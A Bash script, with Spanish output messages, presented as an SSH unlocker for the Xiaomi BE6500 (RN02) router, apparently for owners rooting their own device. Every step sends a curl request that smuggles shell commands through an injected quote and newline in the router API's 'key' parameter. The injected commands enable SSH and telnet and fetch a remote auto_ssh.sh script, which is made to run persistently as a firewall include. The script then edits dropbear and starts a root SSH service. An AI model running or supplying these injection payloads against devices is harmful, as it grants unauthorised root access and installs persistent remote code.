#!/bin/bash

echo "==========================================="
echo " Xiaomi BE6500 (RN02) SSH Unlocker Script"
echo "==========================================="
echo ""

if [ -z "$1" ]; then
    echo "Uso: $0 <STOK>"
    echo "Ejemplo: $0 a1b2c3d4e5f6g7h8i9j0"
    exit 1
fi

STOK=$1
IP="192.168.1.1"

echo "[+] Paso 1: Configurando variables en NVRAM..."
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Anvram%20set%20ssh_en%3D1%27"
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Anvram%20set%20telnet_en%3D1%27"
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Anvram%20set%20uart_en%3D1%27"
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Anvram%20set%20boot_wait%3Don%27"
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Anvram%20commit%27"

echo "[+] Paso 2: Instalando AutoSSH para persistencia de la apertura de puerto..."
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Amkdir%20-p%20%2Fdata%2Fauto_ssh%20%26%26%20cd%20%2Fdata%2Fauto_ssh%20%26%26%20curl%20-O%20https%3A%2F%2Ffastly.jsdelivr.net%2Fgh%2Flemoeo%2FAX6S%40main%2Fauto_ssh.sh%20%26%26%20chmod%20%2Bx%20auto_ssh.sh%27"
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Auci%20set%20firewall.auto_ssh%3Dinclude%20%26%26%20uci%20set%20firewall.auto_ssh.type%3D%27script%27%20%26%26%20uci%20set%20firewall.auto_ssh.path%3D%27%2Fdata%2Fauto_ssh%2Fauto_ssh.sh%27%20%26%26%20uci%20set%20firewall.auto_ssh.enabled%3D%271%27%20%26%26%20uci%20commit%20firewall%27"

echo "[+] Paso 3: Modificando reglas de Dropbear..."
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Ased%20-i%20%27s%2Fchannel%3D.%2A%2Fchannel%3D%22debug%22%2Fg%27%20%2Fetc%2Finit.d%2Fdropbear%27"

echo "[+] Paso 4: Iniciando servicio SSH..."
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0A%2Fetc%2Finit.d%2Fdropbear%20start%27"

echo ""
echo "¡Proceso terminado!"
echo "Calcula tu contraseña por defecto en miwifi.dev/ssh usando tu numero de serie."
echo "Luego conectate con el siguiente comando y modifica la contraseña si lo deseas:"
echo "ssh root@$IP"
